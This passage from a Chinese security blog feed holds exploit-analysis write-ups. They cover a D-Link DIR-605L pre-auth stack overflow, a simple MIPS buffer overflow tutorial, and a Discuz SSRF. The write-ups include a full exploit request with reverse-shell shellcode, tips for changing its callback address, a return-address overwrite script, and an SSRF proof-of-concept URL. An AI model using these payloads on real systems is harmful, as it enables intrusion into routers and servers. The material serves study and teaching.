LOAD:<span class="number">0002</span>B958 loc_2B958:                               # CODE XREF: xdr_union+<span class="number">84</span>j
LOAD:<span class="number">0002</span>B958                 lw      <span class="variable">$ra</span>, <span class="number">0</span>x30+<span class="function">var_4</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B95C                 lw      <span class="variable">$s4</span>, <span class="number">0</span>x30+<span class="function">var_8</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B960                 lw      <span class="variable">$s3</span>, <span class="number">0</span>x30+<span class="function">var_C</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B964                 lw      <span class="variable">$s2</span>, <span class="number">0</span>x30+<span class="function">var_10</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B968                 lw      <span class="variable">$s1</span>, <span class="number">0</span>x30+<span class="function">var_14</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B96C                 lw      <span class="variable">$s0</span>, <span class="number">0</span>x30+<span class="function">var_18</span>(<span class="variable">$sp</span>)
LOAD:<span class="number">0002</span>B970                 jr      <span class="variable">$t9</span>
LOAD:<span class="number">0002</span>B974                 addiu   <span class="variable">$sp</span>, <span class="number">0</span>x30</span>
</code></pre><p>复制s2的值到t9，然后跳到t9执行。中间重新设置了ra和s1等寄存器的值。这里s2可以指向sleep函数，执行完sleep，就会跳到可控的ra执行。</p>
<pre><code>LOAD:<span class="number">000027</span>E8                 move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
LOAD:<span class="number">000027</span>EC                 jalr    <span class="variable">$t9</span> ; sub_22D<span class="number">0</span>
LOAD:<span class="number">000027</span>F<span class="number">0</span>                 addiu   <span class="variable">$a2</span>, <span class="variable">$sp</span>, <span class="number">0x40</span>+var_24
</code></pre><p>下一步是寻找一个栈上的偏移地址。apmib.so中偏移0x27E8的位置，将$sp+0x1c存入$a2,然后跳到$s1,如果把$s1指向apmib.so的0x1D78,这里把$a2复制到$t9，跳转到t9。这样，就可以跳转到一个相对于$sp偏移的地址。只需要把shellcode部署在$sp+0x1C就可以了。</p>
<pre><code>LOAD:<span class="number">00001</span>D78                 move    <span class="variable">$t9</span>, <span class="variable">$a2</span>
LOAD:<span class="number">00001</span>D7C                 jalr    <span class="variable">$t9</span> ; printf
LOAD:<span class="number">00001</span>D8<span class="number">0</span>                 nop
</code></pre><p>最后的请求为：</p>
<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
<span class="attribute">Content-Length</span>: <span class="string">894</span>

<span class="mel">
VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="variable">%2A</span><span class="variable">%BB</span><span class="variable">%19T</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%9D0AAAA</span><span class="variable">%2A</span><span class="variable">%BA</span><span class="variable">%A8</span><span class="variable">%D4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%0DxAAAAAAAAAAAA</span><span class="variable">%2A</span><span class="variable">%AF</span><span class="variable">%17</span><span class="variable">%E8AAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%21</span><span class="variable">%E4</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%21</span><span class="variable">%E5</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10W</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%AF</span><span class="variable">%A2</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF4</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%E0</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%1F</span><span class="variable">%905</span><span class="variable">%CE</span><span class="variable">%1F</span><span class="variable">%90</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E4</span><span class="variable">%3C</span><span class="variable">%0E</span><span class="variable">%7F</span><span class="variable">%015</span><span class="variable">%CE</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%E6</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%E2</span><span class="variable">%24</span><span class="variable">%0C</span><span class="variable">%FF</span><span class="variable">%EF</span><span class="variable">%01</span><span class="variable">%800</span><span class="variable">%27</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%10J</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%0F</span><span class="variable">%FF</span><span class="variable">%FD</span><span class="variable">%01</span><span class="variable">%E0x</span><span class="variable">%27</span><span class="variable">%8F</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%01</span><span class="variable">%E0</span><span class="variable">%28</span><span class="variable">%21</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%DF</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span><span class="variable">%24</span><span class="variable">%10</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%21</span><span class="variable">%EF</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%15</span><span class="variable">%F0</span><span class="variable">%FF</span><span class="variable">%FA</span><span class="variable">%28</span><span class="variable">%06</span><span class="variable">%FF</span><span class="variable">%FF</span><span class="variable">%3C</span><span class="variable">%0F</span><span class="variable">%2F</span><span class="variable">%2F5</span><span class="variable">%EFbi</span><span class="variable">%AF</span><span class="variable">%AF</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%3C</span><span class="variable">%0En</span><span class="variable">%2F5</span><span class="variable">%CEsh</span><span class="variable">%AF</span><span class="variable">%AE</span><span class="variable">%FF</span><span class="variable">%F0</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%F4</span><span class="variable">%27</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%EC</span><span class="variable">%AF</span><span class="variable">%A4</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%AF</span><span class="variable">%A0</span><span class="variable">%FF</span><span class="variable">%FC</span><span class="variable">%27</span><span class="variable">%A5</span><span class="variable">%FF</span><span class="variable">%F8</span><span class="variable">%24</span><span class="variable">%02</span><span class="variable">%0F</span><span class="variable">%AB</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%01</span><span class="variable">%0C</span>&amp;curTime=<span class="number">1348588030496</span>&amp;VER_CODE=<span class="number">1234</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;login_name=admin</span>
</code></pre><p>使用文中提供的exp测试结果：</p>
<p><a href="http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt" target="_blank" rel="external">http://www.devttys0.com/wp-content/uploads/2012/10/dir605l_exploit.txt</a></p>
<p><img src="/images/mipsstackexp5.png" alt=""></p>
<p>poc中，反弹端口和ip写死了。测试起来不是很方便。可以手动修改如下位置：</p>
<pre><code><span class="preprocessor"># port number</span>
<span class="preprocessor"># <span class="number">0x1f90</span> = <span class="number">8080</span></span>
<span class="preprocessor"># <span class="number">0x1ff5</span> =<span class="number">8181</span></span>
<span class="string">"\x3c\x0e\x1f\xf5"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x1f90</span></span>
<span class="string">"\x35\xce\x1f\xf5"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x1f90</span></span>
<span class="string">"\xaf\xae\xff\xe4"</span>, <span class="preprocessor"># sw     t6,-<span class="number">28</span>(sp)</span>

<span class="preprocessor"># Big endian IP address <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span></span>
<span class="preprocessor">#<span class="number">0xc0</span> = <span class="number">192</span></span>
<span class="preprocessor">#<span class="number">0xA8</span> = <span class="number">168</span></span>
<span class="preprocessor">#<span class="number">0x01</span> = <span class="number">1</span></span>
<span class="preprocessor">#<span class="number">0x64</span> = <span class="number">100</span></span>
<span class="preprocessor">#<span class="number">0x65</span> = <span class="number">101</span></span>
<span class="string">"\x3c\x0e\xc0\xA8"</span>, <span class="preprocessor"># lui     t6,<span class="number">0x7f01</span></span>
<span class="string">"\x35\xce\x01\x65"</span>, <span class="preprocessor"># ori     t6,t6,<span class="number">0x101</span></span>
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;翻译自&lt;a href=&quot;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&quot;&gt;http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/&lt;/a&gt;.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个简单的mips架构缓冲区溢出分析</title>
    <link href="http://xdxd.love/2016/11/19/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/11/19/一个简单的mips架构缓冲区溢出分析/</id>
    <published>2016-11-19T07:00:17.000Z</published>
    <updated>2016-11-21T02:53:43.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="缓冲区溢出原理">缓冲区溢出原理</h1><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)<br><a id="more"></a></p>
<h1 id="简单示例">简单示例</h1><pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
    <span class="keyword">char</span> password[<span class="number">100</span>];
    <span class="built_in">printf</span>(<span class="string">"\nPlease input your Password: "</span>);
    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, <span class="string">"stackoverflow"</span>)) {
        <span class="built_in">printf</span>(<span class="string">"Welcome to the new world\n"</span>);
    }<span class="keyword">else</span> {
        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
    }
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>编译代码生成可执行文件。</p>
<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc secret.c -o secret -<span class="keyword">static</span>
</code></pre><p>可以看到这个程序的逻辑比较简单，她要求用户输入一个密码。然后检查密码是否正确，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
<p><img src="/images/simplemips1.png" alt=""></p>
<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
<p>我们来测试一下输入超过100个字符的密码。</p>
<p>可以看到程序正常的运行结束之后抛出了一个提示：</p>
<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
Segmentation fault
</code></pre><p><img src="/images/simplemips2.png" alt=""></p>
<p>使用qemu结合ida进行动态分析：</p>
<p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
<p><img src="/images/simplemips3.png" alt=""></p>
<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
<h1 id="栈空间布局分析">栈空间布局分析</h1><p>因为我们有程序的源码，而且程序比较简单。所以直接阅读汇编代码也比较清晰，只有一个判断分支。</p>
<p><img src="/images/simplemips4.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p>栈操作：MIPS32架构与X86架构一样，都是向低地址增长的。但在MIPS32架构中没有EBP(栈底指针)，进入一个函数时，需要将当前栈指针向下移动n比特，这个大小为n比特的存储空间就是此函数的stack frame的存储区域。此后，栈指针便不在移动，只能在函数返回时将栈指针加上这个偏移量回复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</p>
<p>返回地址：在x86架构中，使用call命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入$RA寄存器而不是堆栈中。（注1）</p>
<pre><code>addiu   <span class="label">$sp</span>, -0x88
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
<span class="keyword">move</span>    <span class="label">$fp</span>, <span class="label">$sp</span>
<span class="keyword">li</span>      <span class="label">$gp</span>, 0x4A6670
<span class="keyword">sw</span>      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$sp</span>)
lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aPleaseInputYou - 0x470000)  # <span class="string">"\nPlease input your Password: "</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, printf
<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; printf
nop
lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
lui     <span class="label">$v0</span>, 0x47  # '<span class="keyword">G</span>'
addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
<span class="keyword">move</span>    <span class="label">$t9</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; __isoc99_scanf
nop
lw      <span class="label">$gp</span>, 0x88+var_78(<span class="label">$fp</span>)
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$v0</span>

addiu   <span class="label">$sp</span>, -0x88
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0x88+var_4(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$fp</span>, 0x88+var_8(<span class="label">$sp</span>)
</code></pre><p>分配栈空间大小为0x88，然后将$ra,$fp保存在堆栈中。</p>
<pre><code>addiu   <span class="label">$a0</span>, <span class="label">$v0</span>, (aS_2 - 0x470000)  # <span class="string">"%s"</span>
addiu   <span class="label">$v0</span>, <span class="label">$fp</span>, 0x88+var_70
<span class="keyword">move</span>    <span class="label">$a1</span>, <span class="label">$v0</span>
<span class="keyword">la</span>      <span class="label">$v0</span>, __isoc99_scanf
</code></pre><p>scanf的参数a1为sp+0x18，可以计算出栈空间的分布。</p>
<p><img src="/images/simplemips5.png" alt=""></p>
<p>password分配了102个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。（图片画错了，应该是$FP）</p>
<p>当password长度为112个字节的时候，可以覆盖返回RA，从而控制返回地址。</p>
<p><img src="/images/simplemips6.png" alt=""></p>
<p>通过动态运行进行观察，输入数据为112个字节。</p>
<pre><code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb
</code></pre><p><img src="/images/simplemips7.png" alt=""></p>
<p>返回地址覆盖成了61616262，然后程序会从0x61616262处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。从而程序崩溃，抛出了段错误。</p>
<h1 id="漏洞利用">漏洞利用</h1><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。</p>
<p>这里我们尝试用登录成功之后执行指令的地址覆盖$RA,从而在我们没有正确的密码的情况下获得需要输入密码才可以获得的信息。</p>
<pre><code>.<span class="keyword">text</span>:<span class="number">00400878</span>                 lui     <span class="variable">$v0</span>, <span class="number">0x47</span>  # <span class="string">'G'</span>
.<span class="keyword">text</span>:<span class="number">0040087</span>C                 addiu   <span class="variable">$a0</span>, <span class="variable">$v0</span>, (aWelcomeToTheNe - <span class="number">0x470000</span>)  # <span class="string">"Welcome to the new world"</span>
.<span class="keyword">text</span>:<span class="number">00400880</span>                 la      <span class="variable">$v0</span>, puts
.<span class="keyword">text</span>:<span class="number">00400884</span>                 <span class="keyword">move</span>    <span class="variable">$t9</span>, <span class="variable">$v0</span>
.<span class="keyword">text</span>:<span class="number">00400888</span>                 jalr    <span class="variable">$t9</span> ; puts
.<span class="keyword">text</span>:<span class="number">0040088</span>C                 nop
.<span class="keyword">text</span>:<span class="number">00400890</span>                 lw      <span class="variable">$gp</span>, <span class="number">0x88</span>+var_78(<span class="variable">$fp</span>)
.<span class="keyword">text</span>:<span class="number">00400894</span>                 j       loc_4008B8
.<span class="keyword">text</span>:<span class="number">00400898</span>                 nop
</code></pre><p>输入正确的密码之后，会跳转到0x00400878处执行。通过前面的分析，已经知道需要112个字节来覆盖$RA。写一个小脚本来生成我们需要的payload</p>
<pre><code>import struct
shellcode = <span class="string">"a"</span>*<span class="number">108</span>
shellcode += struct.<span class="function"><span class="title">pack</span><span class="params">(<span class="string">"&gt;L"</span>,<span class="number">0</span>x00400878)</span></span>
fw = <span class="function"><span class="title">open</span><span class="params">(<span class="string">'shellcode'</span>,<span class="string">'w'</span>)</span></span>
fw.<span class="function"><span class="title">write</span><span class="params">(shellcode)</span></span>
fw.<span class="function"><span class="title">close</span><span class="params">()</span></span>
print ‘ok<span class="string">'</span>
</code></pre><p>可以看到程序成功输出了 ‘welcome to the new world’。</p>
<p><img src="/images/simplemips8.png" alt=""></p>
<h1 id="参考资料-1">参考资料</h1><p>注1 :引用自&lt;&lt;解密家用路由器oday漏洞挖掘技术&gt;&gt;<br><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;缓冲区溢出原理&quot;&gt;缓冲区溢出原理&lt;/h1&gt;&lt;p&gt;简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)&lt;br&gt;
    
    </summary>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
    
  </entry>
  
  <entry>
    <title>discuz最新版20160601 SSRF漏洞分析及修复方案</title>
    <link href="http://xdxd.love/2016/10/19/discuz%E6%9C%80%E6%96%B0%E7%89%8820160601-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/10/19/discuz最新版20160601-SSRF漏洞分析/</id>
    <published>2016-10-19T01:39:52.000Z</published>
    <updated>2016-10-19T02:49:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="http://wufeifei.com/ssrf/" target="_blank" rel="external">SSRF到GET SHELL</a><br>wooyun:wooyun-2015-0151179</p>
<h2 id="漏洞poc">漏洞poc</h2><p>访问：<br>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]<a href="http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6" target="_blank" rel="external">http://23.88.58.149/1.jpg[/img]&amp;inajax=1&amp;fid=2&amp;wysiwyg=1&amp;formhash=ead1f9a6</a></p>
<p>需要带formhash，也可以post方式请求。</p>
<p>discuz有个远程下载图片的功能。虽然有些版本编辑器没有显示远程下载图片的按钮，但是可能也存在这个方法。可以直接通过poc进行验证</p>
<p><img src="/images/discuzssrf2.png" alt=""></p>
<p>可以利用301跳转绕过discuz waf的限制，成为一个无限制的curl ssrf。</p>
<h2 id="代码分析">代码分析</h2><p>source/module/forum/forum_ajax.php</p>
<p>374行:</p>
<pre><code>} <span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">'action'</span>] == <span class="string">'downremoteimg'</span>) {
    <span class="variable">$_GET</span>[<span class="string">'message'</span>] = str_replace(<span class="keyword">array</span>(<span class="string">"\r"</span>, <span class="string">"\n"</span>), <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">'wysiwyg'</span>] ? <span class="string">'&lt;br /&gt;'</span> : <span class="string">''</span>, <span class="string">"\\n"</span>), <span class="variable">$_GET</span>[<span class="string">'message'</span>]);
    preg_match_all(<span class="string">"/\[img\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]|\[img=\d{1,4}[x|\,]\d{1,4}\]\s*([^\[\&lt;\r\n]+?)\s*\[\/img\]/is"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image1</span>, PREG_SET_ORDER);
    preg_match_all(<span class="string">"/\&lt;img.+src=('|\"|)?(.*)(\\1)([\s].*)?\&gt;/ismUe"</span>, <span class="variable">$_GET</span>[<span class="string">'message'</span>], <span class="variable">$image2</span>, PREG_SET_ORDER);
    <span class="variable">$temp</span> = <span class="variable">$aids</span> = <span class="variable">$existentimg</span> = <span class="keyword">array</span>();
    <span class="keyword">if</span>(is_array(<span class="variable">$image1</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image1</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image1</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(!<span class="keyword">empty</span>(<span class="variable">$value</span>[<span class="number">1</span>]) ? <span class="variable">$value</span>[<span class="number">1</span>] : <span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">if</span>(is_array(<span class="variable">$image2</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$image2</span>)) {
        <span class="keyword">foreach</span>(<span class="variable">$image2</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$temp</span>[] = <span class="keyword">array</span>(
                <span class="string">'0'</span> =&gt; <span class="variable">$value</span>[<span class="number">0</span>],
                <span class="string">'1'</span> =&gt; trim(<span class="variable">$value</span>[<span class="number">2</span>])
            );
        }
    }
    <span class="keyword">require_once</span> libfile(<span class="string">'class/image'</span>);
    <span class="keyword">if</span>(is_array(<span class="variable">$temp</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$temp</span>)) {
        <span class="variable">$upload</span> = <span class="keyword">new</span> discuz_upload();
        <span class="variable">$attachaids</span> = <span class="keyword">array</span>();

        <span class="keyword">foreach</span>(<span class="variable">$temp</span> <span class="keyword">as</span> <span class="variable">$value</span>) {
            <span class="variable">$imageurl</span> = <span class="variable">$value</span>[<span class="number">1</span>];
            <span class="variable">$hash</span> = md5(<span class="variable">$imageurl</span>);
            <span class="keyword">if</span>(strlen(<span class="variable">$imageurl</span>)) {
                <span class="variable">$imagereplace</span>[<span class="string">'oldimageurl'</span>][] = <span class="variable">$value</span>[<span class="number">0</span>];
                <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$existentimg</span>[<span class="variable">$hash</span>])) {
                    <span class="variable">$existentimg</span>[<span class="variable">$hash</span>] = <span class="variable">$imageurl</span>;
                    <span class="variable">$attach</span>[<span class="string">'ext'</span>] = <span class="variable">$upload</span>-&gt;fileext(<span class="variable">$imageurl</span>);
                    <span class="keyword">if</span>(!<span class="variable">$upload</span>-&gt;is_image_ext(<span class="variable">$attach</span>[<span class="string">'ext'</span>])) {
                        <span class="keyword">continue</span>;
                    }
                    <span class="variable">$content</span> = <span class="string">''</span>;
                    <span class="keyword">if</span>(preg_match(<span class="string">'/^(http:\/\/|\.)/i'</span>, <span class="variable">$imageurl</span>)) {
                        <span class="variable">$content</span> = dfsockopen(<span class="variable">$imageurl</span>);
</code></pre><p>imageurl最后进入dfsockopen。跟进dfsockopen.</p>
<p>定位到最后发出请求的函数：<br>source/function/function_filesock.php</p>
<pre><code><span class="keyword">function</span> _dfsockopen(<span class="variable">$url</span>, <span class="variable">$limit</span> = <span class="number">0</span>, <span class="variable">$post</span> = <span class="string">''</span>, <span class="variable">$cookie</span> = <span class="string">''</span>, <span class="variable">$bysocket</span> = FALSE, <span class="variable">$ip</span> = <span class="string">''</span>, <span class="variable">$timeout</span> = <span class="number">15</span>, <span class="variable">$block</span> = TRUE, <span class="variable">$encodetype</span>  = <span class="string">'URLENCODE'</span>, <span class="variable">$allowcurl</span> = TRUE, <span class="variable">$position</span> = <span class="number">0</span>, <span class="variable">$files</span> = <span class="keyword">array</span>()) {
    <span class="variable">$return</span> = <span class="string">''</span>;
    <span class="variable">$matches</span> = parse_url(<span class="variable">$url</span>);
    <span class="variable">$scheme</span> = <span class="variable">$matches</span>[<span class="string">'scheme'</span>];
    <span class="variable">$host</span> = <span class="variable">$matches</span>[<span class="string">'host'</span>];
    <span class="variable">$path</span> = <span class="variable">$matches</span>[<span class="string">'path'</span>] ? <span class="variable">$matches</span>[<span class="string">'path'</span>].(<span class="variable">$matches</span>[<span class="string">'query'</span>] ? <span class="string">'?'</span>.<span class="variable">$matches</span>[<span class="string">'query'</span>] : <span class="string">''</span>) : <span class="string">'/'</span>;
    <span class="variable">$port</span> = !empty(<span class="variable">$matches</span>[<span class="string">'port'</span>]) ? <span class="variable">$matches</span>[<span class="string">'port'</span>] : (<span class="variable">$scheme</span> == <span class="string">'http'</span> ? <span class="string">'80'</span> : <span class="string">''</span>);
    <span class="variable">$boundary</span> = <span class="variable">$encodetype</span> == <span class="string">'URLENCODE'</span> ? <span class="string">''</span> : random(<span class="number">40</span>);

    if(<span class="variable">$post</span>) {
        if(!is_array(<span class="variable">$post</span>)) {
            parse_str(<span class="variable">$post</span>, <span class="variable">$post</span>);
        }
        _format_postkey(<span class="variable">$post</span>, <span class="variable">$postnew</span>);
        <span class="variable">$post</span> = <span class="variable">$postnew</span>;
    }
    if(function_exists(<span class="string">'curl_init'</span>) &amp;&amp; function_exists(<span class="string">'curl_exec'</span>) &amp;&amp; <span class="variable">$allowcurl</span>) {
        <span class="variable">$ch</span> = curl_init();
        <span class="variable">$httpheader</span> = array();
        if(<span class="variable">$ip</span>) {
            <span class="variable">$httpheader</span>[] = <span class="string">"Host: "</span>.<span class="variable">$host</span>;
        }
        if(<span class="variable">$httpheader</span>) {
            curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$httpheader</span>);
        }
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$scheme</span>.<span class="string">'://'</span>.(<span class="variable">$ip</span> ? <span class="variable">$ip</span> : <span class="variable">$host</span>).(<span class="variable">$port</span> ? <span class="string">':'</span>.<span class="variable">$port</span> : <span class="string">''</span>).<span class="variable">$path</span>);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">1</span>);
</code></pre><p>使用curl来发出http。而curl支持非常多的协议。<br><img src="/images/discuzssrf3.png" alt=""></p>
<h2 id="漏洞利用">漏洞利用</h2><p>编写一个跳转页面：</p>
<pre><code>&lt;?php  
